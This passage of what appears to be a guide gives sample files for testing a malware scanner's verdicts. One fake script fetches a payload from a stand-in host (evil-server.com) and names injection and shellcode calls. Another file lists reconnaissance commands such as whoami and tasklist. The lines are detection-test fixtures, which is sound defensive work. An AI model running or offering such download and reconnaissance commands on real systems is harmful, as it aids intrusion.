# Test suspicious script
$url = "http://evil-server.com/payload"
Invoke-WebRequest $url
wscript.exe hidden
CreateRemoteThread -inject
VirtualAlloc -shellcode
```

Upload it → triggers **MALICIOUS** ✅

---

## Option 4 — Medium severity (SUSPICIOUS verdict)

Save as **`medium_risk.txt`**:
```
systeminfo
tasklist.exe
whoami.exe
http://update-check.net
```

Upload it → should score **SUSPICIOUS** ✅

---

## Option 5 — Clean file (ALLOW verdict)

Save as **`clean_file.txt`**:
```
This is a normal document.
Hello world, nothing suspicious here.
Just regular text content.
